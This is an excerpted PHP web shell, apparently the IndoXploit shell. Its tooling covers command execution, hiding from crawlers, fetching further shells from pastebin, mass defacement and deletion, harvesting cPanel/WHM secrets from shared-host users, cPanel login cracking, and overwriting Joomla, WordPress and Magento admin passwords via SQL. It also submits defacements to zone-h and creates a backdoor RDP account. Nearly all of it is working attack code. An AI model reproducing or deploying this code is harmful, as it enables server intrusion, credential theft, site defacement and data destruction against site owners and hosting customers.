...
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    ...
    if(preg_match('/' . implode('|', $userAgents) . '/i', (string) $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function login_shell(): void {
?>
<!DOCTYPE HTML>
<html>
<head>
...
if(!isset($_SESSION[md5((string) $_SERVER['HTTP_HOST'])]))
    if($password === '' || $password === '0' || (isset($_POST['password']) && (md5((string) $_POST['password']) == $password)))
        $_SESSION[md5((string) $_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
...
if (function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()) {
    function idx_ss($array): string|array {
        return is_array($array) ? array_map(idx_ss(...), $array) : stripslashes((string) $array);
    }
    $_POST = idx_ss($_POST);
}
?>
...
function color($bold = 1, $colorid = null, $string = null): string {
		$color = [
			"</font>",  			# 0 off
...
function OS(): string {
	return (str_starts_with(strtoupper(PHP_OS), "WIN")) ? "Windows" : "Linux";
}

function exe($cmd): string|false|null {
...
function save($filename, $mode, $file): void {
	$handle = fopen($filename, $mode);
	fwrite($handle, (string) $file);
	fclose($handle);
}

function getfile($name): bool|string {
	if(!is_writable(path())) die(color(1, 1, "Directory '".path().sprintf("' is not writeable. Can't spawn %s.", $name)));
	if($name === "adminer") $get = ["https://www.adminer.org/static/download/4.3.1/adminer-4.3.1.php", "adminer.php"];
	elseif($name === "webconsole") $get = ["https://pastebin.com/raw/2i96fDCN", "webconsole.php"];
	elseif($name === "cgitelnet1") $get = ["https://pastebin.com/raw/Lj46KxFT", "idx_cgi/cgitelnet1.idx"];
	elseif($name === "cgitelnet2") $get = ["https://pastebin.com/raw/aKL2QWfS", "idx_cgi/cgitelnet2.idx"];
	elseif($name === "LRE") $get = ["https://pastebin.com/raw/PVPfA21i", "makman.php"];
...
function writeable($path, $perms): string {
	return (is_writable($path)) ? color(1, 2, $perms) : color(1, 1, $perms);
}

function perms($path): string {
...
function pwd(): void {
	...
	foreach($dir as $key => $index) {
		...
		print sprintf("'>%s</a>/", $index);
	}
	print "<br>";
	print (OS() === "Windows") ? windisk() : "";
}

function windisk(): void {
	$letters = "";
	$v = explode("\\", (string) path());
	$v = $v[0];
	 foreach(range("A", "Z") as $letter) {
	  	...
	  	if($bool) {
	   		$letters .= sprintf("[ <a href='?dir=%s:\\'", $letter).($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"").">";
	   		if($letter . ":" !== $v) {
	   			$letters .= $letter;
	   		}
	   		else {
	...
	if($letters !== '' && $letters !== '0') {
		print sprintf('Detected Drives %s<br>', $letters);
	}
	if(count($quicklaunch) > 0) {
		foreach($quicklaunch as $item) {
	  		$v = realpath(path(). "..");
	  		if(in_array($v, ['', '0', false], true)) {
	  			$a = explode(DIRECTORY_SEPARATOR,(string) path());
	  			unset($a[count($a)-2]);
	  			$v = implode(DIRECTORY_SEPARATOR, $a);
	  		}
...
function serverinfo(): void {
	$disable_functions = @ini_get('disable_functions');
	$disable_functions = (in_array($disable_functions, ['', '0', false], true)) ? color(1, 2, "NONE") : color(1, 1, $disable_functions);
...
function curl($url, $post = false, $data = null): bool|string {
    $ch = curl_init($url);
    	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
...
function getValue($param, $kata1, $kata2): false|string{
    if(!str_contains((string) $param, (string) $kata1)) return FALSE;
    if(!str_contains((string) $param, (string) $kata2)) return FALSE;
    $start 	= strpos((string) $param, (string) $kata1) + strlen((string) $kata1);
    $end 	= strpos((string) $param, (string) $kata2, $start);
    return substr((string) $param, $start, $end - $start);
}

function massdeface($dir, $file, $filename, $type = null): void {
	$scandir = scandir($dir);
	foreach($scandir as $dir_) {
		$path     = sprintf('%s/%s', $dir, $dir_);
...
function massdelete($dir, $filename): void {
	$scandir = scandir($dir);
	foreach($scandir as $dir_) {
		$path     = sprintf('%s/%s', $dir, $dir_);
		$location = sprintf('%s/%s', $path, $filename);
		if($dir_ === '.') {
			if(file_exists(sprintf('%s/%s', $dir, $filename))) {
				unlink(sprintf('%s/%s', $dir, $filename));
			}
		} 
		elseif($dir_ === '..') {
			if(file_exists(dirname((string) $dir).('/' . $filename))) {
				unlink(dirname((string) $dir).('/' . $filename));
			}
		} 
		else {
			if ((is_dir($path) and is_writable($path)) && file_exists($location)) {
...
function tools($toolsname, $args = null): void {
	if($toolsname === "cmd") {
	...
	elseif($toolsname === "readfile") {
		...
		if(!is_file($args)) die(color(1, 1, sprintf("File '%s' is not exists.", $args)));
	...
	elseif($toolsname === "spawn") {
		...
		elseif($args === "cgitelnet1") {
			...
			elseif(file_exists('cgitelnet1.idx')) {
				...
				if(getfile("cgitelnet1")) {
					...
					@rmdir(path()."/idx_cgi/");
					if(!@rmdir(path()."/idx_cgi/") && OS() === "Linux") @exe("rm -rf ".path()."/idx_cgi/");
					if(!@rmdir(path()."/idx_cgi/") && OS() === "Windows") @exe("rmdir /s /q ".path()."/idx_cgi/");
				}
			}
		...
		elseif($args === "phpinfo") {
			if(file_exists('phpinfo.php') && preg_match("/phpinfo()/", file_get_contents('phpinfo.php'))) {
			...
			elseif($_POST['uploadtype'] === '2') {
				...
				if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
					if(@copy($_FILES['file']['tmp_name'], $root)) {
						$act = color(1, 2, "Uploaded!").sprintf(" at <i><b>%s -> </b></i><a href='http://%s' target='_blank'>%s</a>", $root, $web, $web);
					} 
					else {
						$act = color(1, 1, "Failed to upload file!");
					}
	...
	elseif($toolsname === "jumping") {
		...
		foreach(getuser() as $user) {
			$path = sprintf('/home/%s/public_html', $user);
			if(is_readable($path)) {
				$status = color(1, 2, "[R]");
				if(is_writable($path)) {
					$status = color(1, 2, "[RW]");
				...
				$i++;
				print sprintf("%s <a href='?dir=%s'>", $status, $path).color(1, 4, $path)."</a>";
				...
				foreach(getdomainname() as $domain) {
					...
					if($userdomain === $user) {
						print sprintf(" => <a href='http://%s/' target='_blank'>", $domain).color(1, 2, $domain)."</a><br>";
						break;
					}
				}
			}
		}
		print ($i === 0) ? "" : "<p>".color(1, 3, sprintf('Total ada %d kamar di ', $i).$GLOBALS['SERVERIP'])."</p>";
	}
	elseif($toolsname === "idxconfig") {
		...
		if(!is_dir(path()."/idx_config/")) {
			...
			foreach(getuser() as $user) {
				$user_docroot = sprintf('/home/%s/public_html/', $user);
				if(is_readable($user_docroot)) {
					$getconfig = [
						sprintf('/home/%s/.accesshash', $user) => "WHM-accesshash",
					...
					foreach($getconfig as $config => $userconfig) {
						...
						if ($get != '') {
                            $fopen = fopen(sprintf('idx_config/%s-%s.txt', $user, $userconfig), "w");
                            fwrite($fopen, $get);
                        }
					}
				}
	...
	elseif($toolsname === "krdp") {
		...
		if(preg_match("/indoxploit/", (string) exe("net user"))) die(color(1, 1, "[INFO] username 'indoxploit' already exists."));
...
function files_and_folder(): void {
	...
	foreach($dir as $folder) {
		...
		$dirinfo['link']  = ($folder === ".." ? "<a href='?dir=".dirname(path()).sprintf("'>%s</a>", $folder) : ($folder === "." ?  "<a href='?dir=".path().sprintf("'>%s</a>", $folder) : "<a href='?dir=".$dirinfo['path'].sprintf("'>%s</a>", $folder)));
...
function action(): void {
	...
	if(isset($_GET['do'])) {
		if($_GET['do'] === "cmd") {
			if(isset($_POST['cmd'])) {
				if(preg_match("/^rf (.*)$/", (string) $_POST['cmd'], $match)) {
					tools("readfile", $match[1]);
				}
				elseif(preg_match("/^spawn (.*)$/", (string) $_POST['cmd'], $match)) {
					tools("spawn", $match[1]);
				}
				elseif(preg_match("/^symlink$/", (string) $_POST['cmd'], $match)) {
					tools("symlink");
				}
				elseif(preg_match("/^rvr (.*)$/", (string) $_POST['cmd'], $match)) {
					tools("network", $match[1]);
				}
				elseif(preg_match("/^krdp$/", (string) $_POST['cmd'])) {
					tools("krdp");
				}
				elseif(preg_match("/^jumping$/", (string) $_POST['cmd'])) {
					tools("jumping");
				}
				elseif(preg_match("/^idxconfig$/", (string) $_POST['cmd'])) {
					tools("idxconfig");
				}
				elseif(preg_match("/^logout$/", (string) $_POST['cmd'])) {
					unset($_SESSION[md5((string) $_SERVER['HTTP_HOST'])]);
					print "<script>window.location='?';</script>";
				}
				elseif(preg_match("/^killme$/", (string) $_POST['cmd'])) {
					unset($_SESSION[md5((string) $_SERVER['HTTP_HOST'])]);
					@unlink(__FILE__);
					print "<script>window.location='?';</script>";
				}
		...
		elseif($_GET['do'] === "zoneh") {
			if(isset($_POST['submit']) && $_GET['do'] === "zoneh") {
				$nick 	= $_POST['nick'];
				$domain = explode("\r\n", (string) $_POST['url']);

				print sprintf("Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=%s/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=%s/published=0</a><br>", $nick, $nick);
				print sprintf("Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=%s' target='_blank'>http://www.zone-h.org/archive/notifier=%s</a><br><br>", $nick, $nick);
	
				foreach($domain as $no => $url) {
					$no   = ($no+1).".";
					$post = curl("http://www.zone-h.org/notify/single", TRUE, sprintf('defacer=%s&domain1=%s&hackmode=1&reason=1&submit=Send', $nick, $url));
					if(preg_match("/color=\"red\">OK<\/font><\/li>/i", (string) $post)) {
						print sprintf('%s %s -> ', $no, $url).color(1, 2, "OK")."<br>";
					} else {
						print sprintf('%s %s -> ', $no, $url).color(1, 1, "ERROR")."<br>";
					}
				}
			}
			else {
		...
		elseif($_GET['do'] == 'cpanel') {
			if($_POST['crack']) {
				$usercp = explode("\r\n", (string) $_POST['user_cp']);
				$passcp = explode("\r\n", (string) $_POST['pass_cp']);
				$i = 0;
				...
				print ($i === 0) ? "" : "<p>".color(1, 3, sprintf('Sukses nyolong %d Cpanel by IndoXploit', $i))."</p>";
			} else {
				print "<center>
				...
				if(isset($_POST['submitlink'])) {
					...
					preg_match_all('/<a href="(.*?).txt">/', (string) $get, $link);
				...
				foreach($scandir as $files) {
					$file = sprintf('%s/%s', $getpass, $files);
		...
		elseif($_GET['do'] == 'mpc') {
			if($_POST['hajar']) {
				if(strlen((string) $_POST['pass_baru']) < 6 || strlen((string) $_POST['user_baru']) < 6) {
					print "username atau password harus lebih dari 6 karakter";
				} 
				else {
					$user_baru = $_POST['user_baru'];
					$pass_baru = md5((string) $_POST['pass_baru']);
					$conf = $_POST['config_dir'];

					if(preg_match("/^http:\/\//", (string) $conf) || preg_match("/^https:\/\//", (string) $conf)) {
						$get = curl($conf);
						preg_match_all('/<a href="(.*?).txt">/', (string) $get, $link);
						foreach($link[1] as $link_config) {
					...
					foreach($scan_conf as $file_conf) {
						$config = file_get_contents(sprintf('%s/%s', $conf, $file_conf));
						if(preg_match("/JConfig|joomla/",$config)) {
							...
							$q = mysql_query(sprintf('SELECT * FROM %s ORDER BY id ASC', $prefix));
							$result = mysql_fetch_array($q);
							$id = $result['id'];
							$site = getValue($config,"sitename = '","'");
							$update = mysql_query(sprintf("UPDATE %s SET username='%s',password='%s' WHERE id='%s'", $prefix, $user_baru, $pass_baru, $id));
							...
							if($site == '') {
								...
								print sprintf('Sitename => %s<br>', $site);
							}
							if(!$update || !$conn || !$db) {
							...
							$result = mysql_fetch_array($q);
							$id = $result[ID];
							$q2 = mysql_query(sprintf('SELECT * FROM %s ORDER BY option_id ASC', $option));
							...
							if($target == '') {
								...
								$url_target = sprintf("Login => <a href='%s/wp-login.php' target='_blank'><u>%s/wp-login.php</u></a><br>", $target, $target);
							}
							$update = mysql_query(sprintf("UPDATE %s SET user_login='%s',user_pass='%s' WHERE id='%s'", $prefix, $user_baru, $pass_baru, $id));
							print "Config => ".$file_conf."<br>";
						...
						elseif(preg_match("/Magento|Mage_Core/",$config)) {
							...
							$conn = mysql_connect($dbhost,$dbuser,$dbpass);
							$db = mysql_select_db($dbname);
							$q = mysql_query(sprintf('SELECT * FROM %s ORDER BY user_id ASC', $prefix));
							$result = mysql_fetch_array($q);
							$id = $result[\USER_ID];
							$q2 = mysql_query(sprintf("SELECT * FROM %s WHERE path='web/secure/base_url'", $option));
							$result2 = mysql_fetch_array($q2);
							...
							if($target == '') {
								...
								$url_target = sprintf("Login => <a href='%s/admin/' target='_blank'><u>%s/admin/</u></a><br>", $target, $target);
							}
							$update = mysql_query(sprintf("UPDATE %s SET username='%s',password='%s' WHERE user_id='%s'", $prefix, $user_baru, $pass_baru, $id));
							print "Config => ".$file_conf."<br>";
							...
							if($target == '') {
								...
								$url_target = sprintf("Login => <a href='%s' target='_blank'><u>%s</u></a><br>", $target, $target);
							}
							$update = mysql_query(sprintf("UPDATE %s SET username='%s',password='%s' WHERE user_id='%s'", $prefix, $user_baru, $pass_baru, $id));
							print "Config => ".$file_conf."<br>";
						...
						elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
							...
							$conn = mysql_connect($dbhost,$dbuser,$dbpass);
							$db = mysql_select_db($dbname);
							$q = mysql_query(sprintf('SELECT * FROM %s ORDER BY id_identitas ASC', $option));
							$result = mysql_fetch_array($q);
							...
							if($target == '') {
								...
								if($target2 == '') {
									...
									if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
										$url_target2 = sprintf("Login => <a href='%s/adminweb' target='_blank'><u>%s/adminweb</u></a><br>", $target2, $target2);
									} 
									elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
										$url_target2 = sprintf("Login => <a href='%s/lokomedia/adminweb' target='_blank'><u>%s/lokomedia/adminweb</u></a><br>", $target2, $target2);
									} 
									else {
										$url_target2 = sprintf("Login => <a href='%s' target='_blank'><u>%s</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>", $target2, $target2);
									}
								}
							} else {
								...
								if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
									$url_target = sprintf("Login => <a href='%s/adminweb' target='_blank'><u>%s/adminweb</u></a><br>", $target, $target);
								} 
								elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
									$url_target = sprintf("Login => <a href='%s/lokomedia/adminweb' target='_blank'><u>%s/lokomedia/adminweb</u></a><br>", $target, $target);
								} 
								else {
									$url_target = sprintf("Login => <a href='%s' target='_blank'><u>%s</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>", $target, $target);
								}
							}
							$update = mysql_query(sprintf("UPDATE %s SET username='%s',password='%s' WHERE level='admin'", $prefix, $user_baru, $pass_baru));
							print "Config => ".$file_conf."<br>";
		...
		elseif($_GET['do'] == 'fakeroot') {
			...
			if(!preg_match(sprintf('#/home/%s/public_html#', $user), (string) $_SERVER['DOCUMENT_ROOT'])) die(color(1, 1, "I think this server not using shared host :("));
			...
			if($_POST['reverse']) {
				...
				foreach($site as $url) {
					$cek = curl(sprintf('%s/~%s/%s', $url, $user, $file));
					if(preg_match("/hacked/i", (string) $cek)) {
						print sprintf("URL: <a href='%s/~%s/%s' target='_blank'>%s/~%s/%s</a> -> <font color=lime>Fake Root!</font><br>", $url, $user, $file, $url, $user, $file);
					}
				}
			} else {
				print "<center><form method='post'>
	...
	elseif(isset($_GET['act'])) {
		if($_GET['act'] === 'newfile') {
			if($_POST['save']) {
				$filename = htmlspecialchars((string) $_POST['filename']);
		...
		elseif($_GET['act'] === 'newfolder') {
			if($_POST['save']) {
				$foldername = path().'/'.htmlspecialchars((string) $_POST['foldername']);
				if(!@mkdir($foldername)) {
					$act = color(1, 1, "Permission Denied!");
				} 
				else {
		...
		elseif($_GET['act'] === 'rename_folder') {
			if($_POST['save']) {
				$rename_folder = rename(path(), "".dirname((string) path()).DIRECTORY_SEPARATOR.htmlspecialchars((string) $_POST['foldername']));
				if($rename_folder) {
					$act = "<script>window.location='?dir=".dirname((string) path())."';</script>";
				} 
				else {
					$act = color(1, 1, "Permission Denied!");
				}
			...
			print "<form method='post'>
			<input type='text' value='".basename((string) path())."' name='foldername' style='width: 450px;' height='10'>
		...
		elseif($_GET['act'] === 'delete_folder') {
			if(is_dir(path())) {
				if(is_writable(path())) {
					@rmdir(path());
					if(!@rmdir(path()) && OS() === "Linux") @exe("rm -rf ".path());
					if(!@rmdir(path()) && OS() === "Windows") @exe("rmdir /s /q ".path());
					$act = "<script>window.location='?dir=".dirname(path())."';</script>";
				} 
				else {
					$act = color(1, 1, "Could not remove directory '".basename((string) path())."'");
				}
			}
			print $act;
		} 
		elseif($_GET['act'] === 'view') {
			print "Filename: ".color(1, 2, basename((string) $_GET['file']))." [".writeable($_GET['file'], perms($_GET['file']))."]<br>";
		...
		elseif($_GET['act'] === 'edit') {
			if($_POST['save']) {
				...
				$act = $save ? color(1, 2, "File Saved!") : color(1, 1, "Permission Denied!");
				print $act . '<br>';
			}
		...
		elseif($_GET['act'] === 'rename') {
			if($_POST['save']) {
				$rename = rename($_GET['file'], path().DIRECTORY_SEPARATOR.htmlspecialchars((string) $_POST['filename']));
				$act = $rename ? "<script>window.location='?dir=".path()."';</script>" : color(1, 1, "Permission Denied!");
				print $act . '<br>';
			}
			...
			print "<form method='post'>
			<input type='text' value='".basename((string) $_GET['file'])."' name='filename' style='width: 450px;' height='10'>
			<input type='submit' class='input' name='save' value='RENAME'>
			</form>";
		}
		elseif($_GET['act'] === 'delete') {
			$delete = unlink($_GET['file']);
			$act = $delete ? "<script>window.location='?dir=".path()."';</script>" : color(1, 1, "Permission Denied!");
			print $act;
		}
	}
	else {
